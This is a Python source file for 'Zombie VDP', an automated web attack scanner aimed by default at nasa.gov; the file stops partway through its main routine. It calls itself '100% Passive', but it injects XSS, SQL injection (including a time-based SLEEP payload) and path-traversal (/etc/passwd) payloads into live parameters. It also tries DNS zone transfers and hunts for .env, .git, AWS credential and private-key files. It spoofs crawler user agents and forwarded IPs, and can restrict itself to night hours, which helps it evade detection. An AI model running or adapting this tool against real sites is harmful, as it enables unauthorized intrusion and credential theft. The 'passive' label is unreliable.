#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZOMBIE VDP – ULTIMATE IDENTITY EDITION + 4 LEGENDARY FEATURES
──────────────────────────────────────────────────────────
 NASA VDP Compliant | 100% Passive
 Triple Filter: Ninja · Samurai · Ghost
 + Zombie Evidence Locker (encrypted proofs)
 + Zombie Time Slice (night operation)
 + Zombie Auto-PoC Generator (curl scripts)
 + Zombie Memory (resumable scans)
──────────────────────────────────────────────────────────
"""

import asyncio, aiohttp, getpass, hashlib, json, logging, os, random, re, socket, ssl, sqlite3, sys, time, yaml
import dns.resolver, dns.query, dns.zone
from pathlib import Path
from typing import List, Set, Dict, Optional, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from collections import deque, defaultdict
from difflib import SequenceMatcher
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import base64, uuid, secrets, tempfile, resource
from contextlib import asynccontextmanager

# ══════════════════  WARNA & ANIMASI  ══════════════════
try:
    from colorama import Fore, Style, init; init(autoreset=True)
    CYAN=Fore.CYAN; BLUE=Fore.BLUE; YELLOW=Fore.YELLOW; RED=Fore.RED
    GREEN=Fore.GREEN; MAGENTA=Fore.MAGENTA; WHITE=Fore.WHITE; NC=Style.RESET_ALL
    BOLD=Style.BRIGHT; PINK=Fore.MAGENTA
except:
    CYAN=BLUE=YELLOW=RED=GREEN=MAGENTA=WHITE=NC=BOLD=PINK=""

def zombie_loading_bar(duration=2):
    steps=100; bar_len=20; sleep_time=duration/steps
    for i in range(steps+1):
        filled=int(bar_len*i/steps)
        bar='■'*filled+'□'*(bar_len-filled)
        print(f'\r     {PINK}[{NC}{bar}{PINK}]{NC} {CYAN}{i}%{NC}', end='', flush=True)
        time.sleep(sleep_time)
    print()

async def zombie_progress_bar(phase_name, duration=2):
    steps=100; bar_len=20; sleep_time=duration/steps
    for i in range(steps+1):
        filled=int(bar_len*i/steps)
        bar='■'*filled+'□'*(bar_len-filled)
        print(f'\r  {CYAN}{phase_name}{NC} {PINK}[{NC}{bar}{PINK}]{NC} {CYAN}{i}%{NC}', end='', flush=True)
        await asyncio.sleep(sleep_time)
    print()

def ninja_animation(): print(f"{PINK}🥷 Ninja Filter: hanya bukti nyata...{NC}"); zombie_loading_bar(1)
def samurai_animation(): print(f"{RED}⚔️ Samurai Filter: HIGH/CRITICAL + respons signifikan...{NC}"); zombie_loading_bar(1)
def ghost_animation(): print(f"{CYAN}👻 Ghost Filter: confidence ≥98% atau timing/OOB...{NC}"); zombie_loading_bar(1)
def evidence_animation(): print(f"{GREEN}🔒 Zombie Evidence Locker: mengamankan bukti...{NC}"); zombie_loading_bar(1)
def timeslice_animation(): print(f"{BLUE}⏳ Zombie Time Slice: hanya beroperasi di jam yang diizinkan...{NC}"); zombie_loading_bar(1)
def poc_animation(): print(f"{MAGENTA}⚡ Zombie Auto-PoC: membuat skrip pembuktian...{NC}"); zombie_loading_bar(1)
def memory_animation(): print(f"{YELLOW}🧠 Zombie Memory: melanjutkan dari titik terakhir...{NC}"); zombie_loading_bar(1)

# ══════════════════  HEADER POOL  ══════════════════
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

def get_random_headers():
    sec_ch_ua = random.choice([
        '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        '"Chromium";v="124", "Not(A:Brand";v="24", "Google Chrome";v="124"',
    ])
    platforms = ['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']
    architectures = ['"x86"', '"arm"', '"x86_64"']
    bitness = ['"64"', '"32"']
    model = random.choice([None, '"SM-S911B"', '"Pixel 7"', '"iPhone15,2"'])
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"]),
        "Accept-Language": random.choice(["en-US,en;q=0.9,id;q=0.8", "id-ID,id;q=0.9,en;q=0.8", "en-GB,en;q=0.9"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "br, gzip"]),
        "Referer": random.choice(["https://www.google.com/", "https://www.bing.com/", "", ""]),
        "DNT": random.choice(["1", "0", None]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Upgrade-Insecure-Requests": random.choice(["1", "0"]),
        "Sec-Ch-Ua": sec_ch_ua,
        "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
        "Sec-Ch-Ua-Platform": random.choice(platforms),
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site", "same-site"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]),
        "Sec-Fetch-User": random.choice(["?1", "?0"]),
        "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "style", "image", "iframe"]),
        "Cache-Control": random.choice(["max-age=0", "no-cache", "no-store", "private", "public"]),
        "Pragma": random.choice(["no-cache", ""]),
        "Save-Data": random.choice(["on", "off", None]),
        "Viewport-Width": random.choice([None, "390", "414", "375", "393", "412"]),
        "Device-Memory": random.choice([None, "0.5", "1", "2", "4", "8"]),
        "Downlink": random.choice([None, "1.5", "2.5", "5", "10"]),
        "ECT": random.choice([None, "4g", "3g", "2g", "slow-2g"]),
        "RTT": random.choice([None, "50", "100", "150", "200"]),
        "X-Forwarded-For": random.choice([None, "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"]),
        "Sec-CH-UA-Arch": random.choice(architectures),
        "Sec-CH-UA-Bitness": random.choice(bitness),
        "Sec-CH-UA-Full-Version": random.choice(["120.0.6099.109", "119.0.6045.159", "122.0.6261.57", None]),
        "Sec-CH-UA-Model": model,
        "Sec-GPC": random.choice(["1", None]),
        "X-Client-Data": random.choice([None, "CI+2yQEIgrbJAQjEtskBCKm9yQEI4L3JAQiPwckBCIfCyQEIvcLJAQ=="])
    }
    return {k: v for k, v in headers.items() if v is not None}

# ══════════════════  CONFIG  ══════════════════
@dataclass
class Config:
    target_domains: List[str] = field(default_factory=lambda: ["nasa.gov"])
    password: str = ""
    output_dir: str = "./output"
    db_name: str = "zombie.db"
    workflow_steps: List[str] = field(default_factory=lambda: [
        "zombie_recon","zombie_crawl","zombie_dork",
        "zombie_scan","zombie_filter","zombie_deep_scan",
        "zombie_evidence","zombie_poc","zombie_report"
    ])
    max_workers: int = 3
    rate_limit: float = 1.0
    timeout: int = 30
    enable_ssl_verification: bool = False
    crawl_delay: Tuple[float, float] = (5.0, 10.0)
    crawl_depth: int = 2
    max_pages_crawl: int = 100
    dork_patterns: List[str] = field(default_factory=lambda: [
    r'\.env$',                     # File environment variables (kredensial)
    r'\.git/config$',             # Konfigurasi Git (bisa bocorkan remote & token)
    r'wp-config\.php$',           # Konfigurasi WordPress (DB & auth keys)
    r'config\.php$',              # File konfigurasi umum PHP
    r'\.sql$',                    # Backup database mentah
    r'\.log$',                    # File log (sering ada password/API key)
    r'\.bak$',                    # Backup file tidak aman
    r'\.conf$',                   # File konfigurasi service
    r'\.pem$', r'\.key$',         # Private key SSL/SSH
    r'\.htpasswd$',               # File password Basic Auth
    r'/\.aws/credentials$',       # Kredensial AWS
    r'/backup/.*\.(sql|zip|tar|gz|7z)$',  # Backup terkompresi
    r'/phpinfo\.php$',            # Ekspos informasi PHP (sistem)
    r'/server-status$',           # Status Apache (info request & IP)
    r'/actuator/env$',            # Spring Boot environment (kredensial)
    r'password', 
    r'secret', 
    r'api_key', 
    r'token',
    r'/admin', 
    r'/\.git', 
    r'/config', 
    r'/backup'
])
    enable_wayback: bool = True
    enable_commoncrawl: bool = True
    enable_crtsh: bool = True
    enable_otx: bool = True
    enable_urlscan: bool = True
    otx_api_key: str = ""
    urlscan_api_key: str = ""
    confidence_threshold: int = 90
    active_filters: List[str] = field(default_factory=lambda: ["ninja","samurai","ghost"])
    enable_fuzzer: bool = True
    enable_secrets_scan: bool = True
    port_scan_ports: List[int] = field(default_factory=lambda: [80,443,8080,8443,3306,5432,6379,9200,27017])
    port_scan_timeout: int = 5
    # ══════════════════  ZOMBIE LEGENDARY FEATURES  ══════════════════
    enable_evidence_locker: bool = True      # Encrypt & save evidence
    enable_time_slice: bool = False           # Only operate during night hours (UTC)
    time_slice_start: int = 2                 # Start hour (UTC)
    time_slice_end: int = 5                   # End hour (UTC)
    enable_auto_poc: bool = True              # Auto generate curl/PoC scripts
    enable_memory: bool = True                # Resume interrupted scans
    memory_file: str = "zombie_memory.json"   # State file

    def __post_init__(self):
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        (Path(self.output_dir) / "reports").mkdir(exist_ok=True)
        (Path(self.output_dir) / "evidence").mkdir(exist_ok=True)
        (Path(self.output_dir) / "poc").mkdir(exist_ok=True)

    @classmethod
    def from_yaml(cls, path:str="config.yaml") -> 'Config':
        if Path(path).exists():
            with open(path) as f: data = yaml.safe_load(f) or {}
            fields = {f.name for f in cls.__dataclass_fields__.values()}
            filtered = {k:v for k,v in data.items() if k in fields}
            return cls(**filtered)
        return cls()

# ══════════════════  SESSION MANAGER (auto-pause)  ══════════════════
class SessionManager:
    def __init__(self, config: Config):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None
        self.semaphore = asyncio.Semaphore(config.max_workers)
        self.last_request = 0

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=0, ssl=not self.config.enable_ssl_verification)
        self.session = aiohttp.ClientSession(connector=connector)
        return self

    async def __aexit__(self, *args):
        if self.session: await self.session.close()

    async def fetch(self, url: str, method='GET', data=None, headers=None, **kwargs) -> dict:
        async with self.semaphore:
            now = time.monotonic()
            if now - self.last_request < 1/self.config.rate_limit:
                await asyncio.sleep(1/self.config.rate_limit)
            self.last_request = time.monotonic()
            if headers is None: headers = get_random_headers()
            try:
                async with self.session.request(method, url, data=data, headers=headers,
                                                timeout=self.config.timeout, **kwargs) as resp:
                    if resp.status in (429, 403, 503):
                        pause = random.uniform(30, 60)
                        print(f"\n  {YELLOW}⚠ Block terdeteksi ({resp.status}). Auto‑pause {pause:.0f}s...{NC}")
                        await asyncio.sleep(pause)
                    text = await resp.text()
                    return {"status":resp.status,"headers":dict(resp.headers),"text":text,"url":str(resp.url)}
            except Exception as e:
                return {"status":0,"headers":{},"text":"","url":url}

# ══════════════════  DATABASE  ══════════════════
class Database:
    def __init__(self, db_path:str):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.execute("""CREATE TABLE IF NOT EXISTS findings (
            id TEXT PRIMARY KEY, url TEXT, vuln_type TEXT, severity TEXT, param TEXT, confidence INTEGER,
            evidence TEXT, response_length INTEGER, method TEXT, timestamp TEXT
        )""")
        self.conn.commit()

    def save(self, finding: Dict):
        fid = finding.get("id", str(uuid.uuid4())[:8])
        self.conn.execute("INSERT OR REPLACE INTO findings VALUES (?,?,?,?,?,?,?,?,?,?)",
                          (fid, finding["url"], finding["vuln_type"], finding["severity"],
                           finding.get("param",""), finding["confidence"],
                           finding.get("evidence",""), finding.get("response_length",0),
                           finding.get("method",""), datetime.now().isoformat()))
        self.conn.commit()
        return fid

    def all(self):
        return self.conn.execute("SELECT * FROM findings ORDER BY severity DESC").fetchall()

# ══════════════════  ZOMBIE RECON (fungsi sama) ══════════════════
async def zombie_wayback(sm, domain):
    urls=set()
    try:
        resp=await sm.fetch(f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&collapse=urlkey&fl=original")
        if resp["status"]==200:
            data=json.loads(resp["text"])
            for row in data[1:500]:
                if domain in row[0]: urls.add(row[0])
    except: pass
    return urls

async def zombie_commoncrawl(sm, domain):
    urls=set()
    try:
        idx="CC-MAIN-2024-10"
        resp=await sm.fetch(f"http://index.commoncrawl.org/{idx}-index?url=*.{domain}/*&output=json&matchType=domain&fl=url")
        if resp["status"]==200:
            for line in resp["text"].splitlines():
                if domain in line: urls.add(json.loads(line)["url"])
    except: pass
    return urls

async def zombie_crtsh(sm, domain):
    urls=set()
    try:
        resp=await sm.fetch(f"https://crt.sh/?q=%.{domain}&output=json")
        if resp["status"]==200:
            data=json.loads(resp["text"])
            for entry in data[:200]:
                for sub in entry.get("name_value","").split():
                    if domain in sub: urls.add(f"https://{sub.strip('*.')}")
    except: pass
    return urls

async def zombie_otx(sm, domain, api_key):
    urls=set()
    if not api_key: return urls
    headers={"X-OTX-API-KEY":api_key}
    try:
        async with aiohttp.ClientSession(headers=headers) as sess:
            async with sess.get(f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/url_list") as resp:
                if resp.status==200:
                    data=await resp.json()
                    for item in data.get("url_list",[])[:200]:
                        if domain in item.get("url",""): urls.add(item["url"])
    except: pass
    return urls

async def zombie_urlscan(sm, domain, api_key):
    urls=set()
    if not api_key: return urls
    headers={"API-Key":api_key}
    try:
        async with aiohttp.ClientSession(headers=headers) as sess:
            async with sess.get(f"https://urlscan.io/api/v1/search/?q=domain:{domain}") as resp:
                if resp.status==200:
                    data=await resp.json()
                    for result in data.get("results",[])[:100]:
                        u=result.get("page",{}).get("url")
                        if u and domain in u: urls.add(u)
    except: pass
    return urls

async def zombie_dns_enum(domain):
    subs=set()
    resolver=dns.resolver.Resolver(); resolver.timeout=2
    for sub in ["www","mail","api","dev","admin","portal","cdn","static","assets"]:
        try:
            resolver.resolve(f"{sub}.{domain}", 'A')
            subs.add(f"{sub}.{domain}")
        except: continue
    return subs

async def zombie_zone_transfer(domain):
    loop=asyncio.get_event_loop(); subs=set()
    try:
        ns_answers=dns.resolver.resolve(domain,'NS')
        for ns in ns_answers:
            ns_server=str(ns).rstrip('.')
            try:
                zone=await asyncio.wait_for(
                    loop.run_in_executor(None, dns.zone.from_xfr, dns.query.xfr(ns_server,domain)),
                    timeout=10
                )
                for name in zone: subs.add(f"{name}.{domain}")
            except: continue
    except: pass
    return subs

# ══════════════════  ZOMBIE CRAWLER  ══════════════════
class ZombieCrawler:
    def __init__(self, config: Config): self.config=config
    async def crawl(self, sm, base_domains, seed_urls=set()):
        visited=set()
        queue=deque([(u,0) for u in seed_urls if any(d in u for d in base_domains)])
        for d in base_domains: queue.append((f"https://{d}",0))
        while queue and len(visited)<self.config.max_pages_crawl:
            url,depth=queue.popleft()
            if url in visited: continue
            visited.add(url)
            if depth>=self.config.crawl_depth: continue
            resp=await sm.fetch(url)
            if resp["status"]!=200: continue
            try:
                from bs4 import BeautifulSoup
                soup=BeautifulSoup(resp["text"],'html.parser')
                for link in soup.find_all('a',href=True):
                    full=urljoin(url,link['href'])
                    if any(d in full for d in base_domains) and full not in visited:
                        queue.append((full,depth+1))
            except: pass
            await asyncio.sleep(random.uniform(*self.config.crawl_delay))
        return visited

# ══════════════════  ZOMBIE DORKING (INTERNAL)  ══════════════════
class ZombieDorker:
    def __init__(self, config: Config): self.config=config
    def execute(self, urls: Set[str]) -> Set[str]:
        filtered=set()
        for url in urls:
            for pattern in self.config.dork_patterns:
                if re.search(pattern, url, re.IGNORECASE):
                    filtered.add(url); break
        return filtered

# ══════════════════  VULN CHECKS  ══════════════════
def inject_payload(url, param, payload):
    parsed=urlparse(url)
    q=parse_qs(parsed.query); q[param]=[payload]
    return urlunparse(parsed._replace(query=urlencode(q, doseq=True)))

async def zombie_xss(sm, url, param, config):
    for p in ['"><script>alert(1)</script>','<img src=x onerror=alert(1)>']:
        test_url=inject_payload(url,param,p)
        resp=await sm.fetch(test_url)
        if p in resp["text"]:
            return {"vuln_type":"XSS","severity":"HIGH","confidence":95,"param":param,
                    "evidence":resp["text"][:200],"response_length":len(resp["text"]),
                    "method":"reflected","url":url,"payload":p}
    return None

async def zombie_sqli(sm, url, param, config):
    errors=["sql syntax","mysql_fetch","unclosed quotation","SQLSTATE"]
    for p in ["' OR '1'='1","1 AND 1=1"]:
        resp=await sm.fetch(inject_payload(url,param,p))
        if any(e in resp["text"].lower() for e in errors):
            return {"vuln_type":"SQLi","severity":"CRITICAL","confidence":92,"param":param,
                    "evidence":resp["text"][:200],"response_length":len(resp["text"]),
                    "method":"error","url":url,"payload":p}
    return None

async def zombie_lfi(sm, url, param):
    resp=await sm.fetch(inject_payload(url,param,"../../../../etc/passwd"))
    if "root:x:" in resp["text"]:
        return {"vuln_type":"LFI","severity":"HIGH","confidence":100,"param":param,
                "evidence":resp["text"][:200],"response_length":len(resp["text"]),
                "method":"reflected","url":url,"payload":"../../../../etc/passwd"}
    return None

# ══════════════════  FUZZER  ══════════════════
class ZombieFuzzer:
    def __init__(self): self.baselines={}
    async def baseline(self, sm, url):
        resp=await sm.fetch(url)
        bl={"length":len(resp["text"]),"hash":hashlib.md5(resp["text"].encode()).hexdigest(),
            "text":resp["text"][:5000],"status":resp["status"],"headers":resp["headers"]}
        self.baselines[url]=bl; return bl
    async def fuzz(self, sm, url, param, payloads):
        baseline=await self.baseline(sm, url); anomalies=[]
        for p in payloads:
            test_url=inject_payload(url,param,p)
            start=time.monotonic(); resp=await sm.fetch(test_url); elapsed=time.monotonic()-start
            len_diff=abs(len(resp["text"])-baseline["length"])/max(baseline["length"],1)
            hash_diff=hashlib.md5(resp["text"].encode()).hexdigest()!=baseline["hash"]
            status_diff=resp["status"]!=baseline["status"]
            similarity=SequenceMatcher(None,resp["text"][:2000],baseline["text"][:2000]).ratio()
            time_anomaly=elapsed>2.0
            error_count=sum(resp["text"].lower().count(kw) for kw in ["sql","syntax","mysql","error","exception","warning"])
            score=0.0
            if len_diff>0.3: score+=0.3
            if hash_diff: score+=0.2
            if status_diff: score+=0.2
            if similarity<0.7: score+=0.3
            if time_anomaly: score+=0.2
            score+=min(error_count*0.05,0.3)
            if score>=0.9:
                anomalies.append({"vuln_type":"XSS (fuzzer)","severity":"HIGH",
                                  "confidence":int(score*100),"param":param,
                                  "evidence":resp["text"][:200],"response_length":len(resp["text"]),
                                  "method":"fuzzer","url":url,"payload":p})
        return anomalies

# ══════════════════  SECRETS  ══════════════════
SECRET_PATTERNS = [
    ('AWS Access Key', r'AKIA[0-9A-Z]{16}'),
    ('GitHub Token', r'ghp_[0-9a-zA-Z]{36}'),
    ('Slack Webhook', r'https://hooks.slack.com/services/[A-Za-z0-9/]+'),
    ('Generic JWT', r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+'),
]
async def zombie_find_secrets(url, text):
    found=[]
    for name,pat in SECRET_PATTERNS:
        for match in re.finditer(pat, text):
            found.append({"vuln_type":f"Secret: {name}","severity":"HIGH","confidence":95,
                          "param":match.group(),"evidence":text[match.start()-20:match.end()+20],
                          "response_length":0,"method":"pattern","url":url,"payload":match.group()})
    return found

# ══════════════════  TRIPLE FILTER  ══════════════════
class NinjaFilter:
    def apply(self, findings):
        return [f for f in findings if f.get("evidence") and f.get("confidence",0)>=90]
class SamuraiFilter:
    def apply(self, findings):
        return [f for f in findings if f.get("severity") in ("HIGH","CRITICAL") and f.get("response_length",0)>0 and f.get("confidence",0)>=90]
class GhostFilter:
    def apply(self, findings):
        return [f for f in findings if (f.get("method") in ("timing","oob") or f.get("confidence",0)>=98) and f.get("confidence",0)>=90]
class FilterPipeline:
    def __init__(self, config: Config):
        self.filters=[]
        for name in config.active_filters:
            if name=="ninja": self.filters.append(NinjaFilter())
            elif name=="samurai": self.filters.append(SamuraiFilter())
            elif name=="ghost": self.filters.append(GhostFilter())
    def apply(self, findings):
        for f in self.filters: findings=f.apply(findings)
        return findings

# ══════════════════  ZOMBIE DEEP SCAN  ══════════════════
async def zombie_deep_scan(sm, filtered_findings):
    for finding in filtered_findings:
        if finding["vuln_type"]=="SQLi" and finding.get("method")!="timing":
            start=time.monotonic()
            await sm.fetch(inject_payload(finding["url"], finding["param"], "' AND SLEEP(3)--"))
            if time.monotonic()-start>2.5:
                finding["confidence"]=99; finding["method"]="timing"
    return filtered_findings

# ══════════════════  4 LEGENDARY FEATURES  ══════════════════
import shutil, zipfile
try:
    from cryptography.fernet import Fernet
    CRYPTO_OK = True
except:
    CRYPTO_OK = False

class ZombieEvidenceLocker:
    """Encrypt and store raw evidence for each finding."""
    def __init__(self, config: Config):
        self.config = config
        self.key_file = Path(config.output_dir) / "evidence" / ".key"
        if not self.key_file.exists() and CRYPTO_OK:
            key = Fernet.generate_key()
            self.key_file.write_bytes(key)
        self.cipher = Fernet(self.key_file.read_bytes()) if CRYPTO_OK and self.key_file.exists() else None

    def lock(self, finding: Dict):
        fid = finding.get("id", str(uuid.uuid4())[:8])
        evidence_path = Path(self.config.output_dir) / "evidence" / f"{fid}.zombie"
        data = json.dumps({
            "url": finding["url"],
            "vuln_type": finding["vuln_type"],
            "payload": finding.get("payload",""),
            "evidence": finding.get("evidence",""),
        }).encode()
        if self.cipher:
            data = self.cipher.encrypt(data)
        evidence_path.write_bytes(data)
        return str(evidence_path)

class ZombieTimeSlice:
    """Only allow operations during configured hours (UTC)."""
    def __init__(self, config: Config): self.config=config
    async def wait_if_needed(self):
        while self.config.enable_time_slice:
            now=datetime.utcnow().hour
            if self.config.time_slice_start <= now < self.config.time_slice_end:
                break
            print(f"{YELLOW}⏳ Zombie Time Slice: di luar jam operasi. Menunggu...{NC}")
            await asyncio.sleep(300)  # cek setiap 5 menit

class ZombieAutoPoC:
    """Generate curl/Python scripts to reproduce findings."""
    def __init__(self, config: Config): self.config=config
    def generate(self, finding: Dict):
        fid = finding.get("id", str(uuid.uuid4())[:8])
        poc_dir = Path(self.config.output_dir) / "poc" / fid
        poc_dir.mkdir(exist_ok=True)
        # curl script
        curl_cmd = f"curl -X GET '{finding['url']}' -H 'User-Agent: ZombieVDP/1.0'"
        if finding.get("param"):
            curl_cmd = f"curl -X GET '{inject_payload(finding['url'], finding['param'], finding['payload'])}' -H 'User-Agent: ZombieVDP/1.0'"
        (poc_dir / "reproduce.sh").write_text(f"#!/bin/bash\n{curl_cmd}\n")
        # python script
        py_script = f"""import requests
r = requests.get("{inject_payload(finding['url'], finding['param'], finding['payload'])}", headers={{"User-Agent":"ZombieVDP/1.0"}})
print(r.status_code, len(r.text))
"""
        (poc_dir / "reproduce.py").write_text(py_script)
        return str(poc_dir)

class ZombieMemory:
    """Save and resume scan progress."""
    def __init__(self, config: Config):
        self.config = config
        self.file = Path(config.output_dir) / config.memory_file
    def load(self):
        if self.file.exists():
            return json.loads(self.file.read_text())
        return {"scanned_urls":[], "findings_ids":[], "last_step":None}
    def save(self, state: Dict):
        self.file.write_text(json.dumps(state))
    def mark_scanned(self, url: str):
        state = self.load()
        if url not in state["scanned_urls"]:
            state["scanned_urls"].append(url)
        self.save(state)
    def was_scanned(self, url: str):
        return url in self.load()["scanned_urls"]

# ══════════════════  REPORT  ══════════════════
def zombie_report(db, output_dir):
    findings=db.all()
    if not findings:
        print(f"{YELLOW}⚠ No high/critical findings to report.{NC}")
        return None
    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
    report_path=output_dir/"reports"/f"zombie_{ts}.html"
    with open(report_path,'w',encoding='utf-8') as f:
        f.write("<html><head><title>Zombie VDP Report</title><style>body{font-family:monospace;background:#0a0e27;color:#ccc;padding:20px}h1{color:#00d4ff}.finding{margin:8px 0;padding:5px;border-left:3px solid #ff8800}</style></head><body>")
        f.write(f"<h1>🧟 Zombie VDP Report</h1><p>Generated: {datetime.now()}</p><h2>Findings ({len(findings)})</h2>")
        for row in findings:
            url,vuln,sev,param,conf=row[1],row[2],row[3],row[4],row[5]
            f.write(f"<div class='finding'><strong>{vuln}</strong> [{sev}] @ <a href='{url}'>{url}</a> | Param: {param} | Confidence: {conf}%</div>")
        f.write("</body></html>")
    logger.info(f"Report saved to {report_path}")
    return report_path

# ══════════════════  MAIN  ══════════════════
async def main():
    config = Config.from_yaml()
    db = Database(config.db_name)
    pipeline = FilterPipeline(config)
    evidence_locker = ZombieEvidenceLocker(config)
    time_slice = ZombieTimeSlice(config)
    auto_poc = ZombieAutoPoC(config)
    memory = ZombieMemory(config)

    # ── Password ──
    if config.password:
        pwd = getpass.getpass(f"{YELLOW}🔐 Password: {NC}")
        if pwd != config.password:
            print(f"{RED}✗ Wrong password.{NC}"); return
        zombie_art = f"""
{CYAN}███████╗ ██████╗ ███╗   ███╗██████╗ ██╗███████╗
╚══███╔╝██╔═══██╗████╗ ████║██╔══██╗██║██╔════╝
  ███╔╝ ██║   ██║██╔████╔██║██████╔╝██║█████╗
 ███╔╝  ██║   ██║██║╚██╔╝██║██╔══██╗██║██╔══╝
███████╗╚██████╔╝██║ ╚═╝ ██║██████╔╝██║███████╗
╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝╚══════╝{NC}
{PINK}        ☣  Z O M B I E   S Y S T E M  ☣{NC}
{PINK}   + Evidence Locker · Time Slice · Auto-PoC · Memory{NC}
"""
        print(zombie_art); zombie_loading_bar(2)
    else:
        print(f"{YELLOW}⚠ No password set – langsung menjalankan.{NC}"); zombie_loading_bar(2)

    # ── Time Slice ──
    await time_slice.wait_if_needed()

    async with SessionManager(config) as sm:
        ctx = {"all_urls": set(), "subdomains": set(), "raw_findings": [], "final_findings": []}
        # ── Zombie Memory: resume ──
        state = memory.load()
        if state.get("last_step"):
            print(f"{YELLOW}🧠 Zombie Memory: Melanjutkan dari '{state['last_step']}'...{NC}")
            ctx["all_urls"] = set(state.get("all_urls", []))
            ctx["subdomains"] = set(state.get("subdomains", []))

        async def zombie_recon_phase():
            urls = set()
            for domain in config.target_domains:
                if config.enable_wayback: urls |= await zombie_wayback(sm, domain)
                if config.enable_commoncrawl: urls |= await zombie_commoncrawl(sm, domain)
                if config.enable_crtsh: urls |= await zombie_crtsh(sm, domain)
                if config.enable_otx and config.otx_api_key: urls |= await zombie_otx(sm, domain, config.otx_api_key)
                if config.enable_urlscan and config.urlscan_api_key: urls |= await zombie_urlscan(sm, domain, config.urlscan_api_key)
                subs = await zombie_dns_enum(domain); zone_subs = await zombie_zone_transfer(domain)
                ctx["subdomains"] |= subs | zone_subs
                urls |= {f"https://{s}" for s in ctx["subdomains"]}
            ctx["all_urls"] = urls
            memory.save({"last_step":"zombie_recon","all_urls":list(urls),"subdomains":list(ctx["subdomains"])})

        async def zombie_crawl_phase():
            crawler = ZombieCrawler(config)
            crawled = await crawler.crawl(sm, config.target_domains, ctx["all_urls"])
            ctx["all_urls"] |= crawled
            memory.save({"last_step":"zombie_crawl","all_urls":list(ctx["all_urls"])})

        async def zombie_dork_phase():
            dorker = ZombieDorker(config)
            dorked = dorker.execute(ctx["all_urls"])
            ctx["all_urls"] = dorked
            memory.save({"last_step":"zombie_dork","all_urls":list(ctx["all_urls"])})

        async def zombie_scan_phase():
            raw = []
            urls = list(ctx["all_urls"])[:100]
            for url in urls:
                params = set(parse_qs(urlparse(url).query).keys())
                for param in params:
                    r = await zombie_xss(sm, url, param, config)
                    if r: raw.append(r)
                    r = await zombie_sqli(sm, url, param, config)
                    if r: raw.append(r)
                    r = await zombie_lfi(sm, url, param)
                    if r: raw.append(r)
                if config.enable_fuzzer and params:
                    fuzzer = ZombieFuzzer()
                    for param in params:
                        anoms = await fuzzer.fuzz(sm, url, param, ['"><script>alert(1)</script>', '<img src=x onerror=alert(1)>'])
                        raw.extend(anoms)
            if config.enable_secrets_scan:
                for url in urls[:50]:
                    resp = await sm.fetch(url)
                    if resp["text"]: raw.extend(await zombie_find_secrets(url, resp["text"]))
            ctx["raw_findings"] = raw
            memory.save({"last_step":"zombie_scan"})

        async def zombie_filter_phase():
            print(f"\n{PINK}{BOLD}FILTERING WITH TRIPLE WARRIORS...{NC}")
            ninja_animation(); samurai_animation(); ghost_animation()
            filtered = pipeline.apply(ctx["raw_findings"])
            ctx["final_findings"] = filtered
            memory.save({"last_step":"zombie_filter"})

        async def zombie_deep_scan_phase():
            findings = await zombie_deep_scan(sm, ctx["final_findings"])
            for f in findings:
                fid = db.save(f)
                f["id"] = fid
            ctx["final_findings"] = findings
            memory.save({"last_step":"zombie_deep_scan"})

        async def zombie_evidence_phase():
            if not config.enable_evidence_locker: return
            evidence_animation()
            for f in ctx["final_findings"]:
                path = evidence_locker.lock(f)
                logger.info(f"Evidence locked: {path}")

        async def zombie_poc_phase():
            if not config.enable_auto_poc: return
            poc_animation()
            for f in ctx["final_findings"]:
                path = auto_poc.generate(f)
                logger.info(f"PoC generated: {path}")

        async def zombie_report_phase():
            path = zombie_report(db, Path(config.output_dir))
            if path: print(f"{GREEN}✔ Report generated: {path}{NC}")

        ctx["zombie_recon"] = zombie_recon_phase
        ctx["zombie_crawl"] = zombie_crawl_phase
